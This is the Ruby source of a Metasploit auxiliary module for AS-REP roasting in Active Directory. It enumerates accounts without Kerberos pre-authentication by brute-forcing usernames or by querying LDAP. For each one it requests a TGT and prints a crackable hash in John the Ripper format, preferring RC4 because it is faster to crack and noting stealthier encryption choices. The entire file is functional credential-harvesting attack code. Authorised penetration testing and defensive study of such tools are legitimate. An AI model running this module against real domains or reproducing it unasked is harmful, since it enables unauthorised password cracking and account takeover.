##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Kerberos::Client
  include Msf::Exploit::Remote::LDAP
  include Msf::Exploit::Remote::LDAP::Queries
  include Msf::OptionalSession::LDAP

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Find Users Without Pre-Auth Required (ASREP-roast)',
        'Description' => %q{
          This module searches for AD users without pre-auth required. Two different approaches
          are provided:
          - Brute force of usernames (does not require a user account; should not lock out accounts)
          - LDAP lookup (requires an AD user account)
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'smashery', # MSF Module
        ],
        'References' => [
          ['URL', 'https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [],
          'AKA' => ['preauth', 'asreproast']
        },
        'Actions' => [
          ['BRUTE_FORCE', { 'Description' => 'Brute force to find susceptible user accounts' } ],
          ['LDAP', { 'Description' => 'Ask a domain controller directly for the susceptible user accounts' } ],
        ],
        'DefaultAction' => 'BRUTE_FORCE'
      )
    )

    register_options(
      [
        Opt::RHOSTS(nil, true, 'The target KDC, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html'),
        OptPath.new('USER_FILE', [ false, 'File containing usernames, one per line' ], conditions: %w[ACTION == BRUTE_FORCE]),
        OptBool.new('USE_RC4_HMAC', [ true, 'Request using RC4 hash instead of default encryption types (faster to crack)', true]),
        OptString.new('Rhostname', [ false, "The domain controller's hostname"], aliases: ['LDAP::Rhostname']),
      ]
    )
    register_option_group(name: 'SESSION',
                          description: 'Used when connecting to LDAP over an existing SESSION',
                          option_names: %w[RHOSTS],
                          required_options: %w[SESSION RHOSTS])
    register_advanced_options(
      [
        OptEnum.new('LDAP::Auth', [true, 'The Authentication mechanism to use', Msf::Exploit::Remote::AuthOption::NTLM, Msf::Exploit::Remote::AuthOption::LDAP_OPTIONS]),
      ]
    )

    default_config_file_path = File.join(::Msf::Config.data_directory, 'auxiliary', 'gather', 'ldap_query', 'ldap_queries_default.yaml')
    loaded_queries = safe_load_queries(default_config_file_path) || []
    asrep_roast_query = loaded_queries.select { |entry| entry['action'] == 'ENUM_USER_ASREP_ROASTABLE' }
    self.ldap_query = asrep_roast_query[0]
  end

  def run
    case action.name
    when 'BRUTE_FORCE'
      run_brute
    when 'LDAP'
      run_ldap
    end
  end

  def run_brute
    result_count = 0
    user_file = datastore['USER_FILE']
    username = datastore['LDAPUsername']
    if user_file.blank? && username.blank?
      fail_with(Msf::Module::Failure::BadConfig, 'User file or username must be specified when brute forcing')
    end
    if username.present?
      begin
        roast(datastore['LDAPUsername'])
        result_count += 1
      rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
        # User either not present, or requires preauth
        vprint_status("User: #{username} - #{e}")
      end
    end
    if user_file.present?
      File.open(user_file, 'rb') do |file|
        file.each_line(chomp: true) do |user_from_file|
          roast(user_from_file)
          result_count += 1
        rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
          # User either not present, or requires preauth
          vprint_status("User: #{user_from_file} - #{e}")
        end
      end
    end

    if result_count == 0
      print_error('No users found without preauth required')
    else
      print_line
      print_status("Query returned #{result_count} #{'result'.pluralize(result_count)}.")
    end
  end

  def run_ldap
    fail_with(Msf::Module::Failure::BadConfig, 'Must provide a username for connecting to LDAP') if datastore['LDAPUsername'].blank?

    ldap_connect do |ldap|
      validate_bind_success!(ldap)
      unless (base_dn = ldap.base_dn)
        fail_with(Failure::UnexpectedReply, "Couldn't discover base DN!")
      end

      schema_dn = ldap.schema_dn
      filter_string = ldap_query['filter']
      attributes = ldap_query['attributes']
      begin
        filter = Net::LDAP::Filter.construct(filter_string)
      rescue StandardError => e
        fail_with(Failure::BadConfig, "Could not compile the filter #{filter_string}. Error was #{e}")
      end

      print_line
      result_count = perform_ldap_query_streaming(ldap, filter, attributes, base_dn, schema_dn) do |result, _attribute_properties|
        username = result.samaccountname[0]
        begin
          roast(username)
        rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
          print_error("#{username} reported as ASREP-roastable, but received error when attempting to retrieve TGT (#{e})")
        end
      end
      if result_count == 0
        print_error("No entries could be found for #{filter_string}!")
      else
        print_line
        print_good("Query returned #{result_count} #{'result'.pluralize(result_count)}.")
      end
    end
  end

  def roast(username)
    res = send_request_tgt(
      server_name: "krbtgt/#{datastore['domain']}",
      client_name: username,
      realm: datastore['LDAPDomain'],
      offered_etypes: etypes,
      rport: 88,
      rhost: datastore['RHOST']
    )
    hash = format_as_rep_to_john_hash(res.as_rep)
    print_line(hash)
  end

  def etypes
    if datastore['USE_RC4_HMAC']
      [Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC]
    else
      # We could just ask for AES256, but we have an opportunity to be stealthier by asking for a normal set of etypes,
      # and expecting to receive AES256. This assumption may be broken in the future if additional encryption types are added
      Rex::Proto::Kerberos::Crypto::Encryption::DefaultOfferedEtypes
    end
  end

  attr_accessor :ldap_query # The LDAP query for this module, loaded from a yaml file

end
